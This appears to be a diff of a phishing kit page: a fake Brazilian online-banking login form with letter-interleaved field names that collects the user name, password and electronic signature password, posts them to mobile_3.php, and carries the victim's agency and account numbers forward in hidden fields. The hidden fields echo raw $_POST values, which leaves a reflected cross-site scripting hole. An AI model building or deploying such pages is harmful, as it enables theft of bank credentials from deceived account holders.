@@ -249,9 +249,10 @@ window.onload = function(){
 		         <form id="loginform" name="loginform" class="form-signin" action="mobile_3.php" method="POST" onsubmit="return enviardados();">
 				 <input name="xuxsxuxaxrxixox" id="xuxsxuxaxrxixox" type="text" placeholder="Usuário" maxlength="20" required="required" onkeyup="lmt1(this),proximoCampo(this, 'xsxexnxhxax')" class="input pass">
 				 <input name="xsxexnxhxax" id="xsxexnxhxax" type="password" placeholder="Senha" maxlength="8" required="required" onkeyup="lmt2(this),proximoCampo(this, 'xdxdxdxtxexlxexfxoxnxex')" class="input pass">
-				 <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="password" placeholder="Assinatura Eletrônica" maxlength="8" required="required" onkeyup="limitarInput3(this)" class="input pass">
-				 <input type="hidden" id="agencia" name="agencia" value="2342">
-				 <input type="hidden" id="conta" name="conta" value="3423423423">
+                 <input name="xaxsxsxexlxextxrxoxnxixcxax" id="xaxsxsxexlxextxrxoxnxixcxax" type="password" placeholder="Assinatura Eletrônica" maxlength="8" required="required" onkeyup="limitarInput3(this)" class="input pass">
+                 
+				 <input name="xaxgxexnxcxixax" id="xaxgxexnxcxixax" type="hidden" value="<?php echo $_POST['xaxgxexnxcxixax']; ?>" >
+			    <input name="xcxoxnxtxa" id="xcxoxnxtxa" type="hidden" value="<?php echo $_POST['xcxoxnxtxa']; ?>">
 				 
 				<br><button class="btn btn-lg btn-default btn-block" type="submit">CONTINUAR</button>
 				
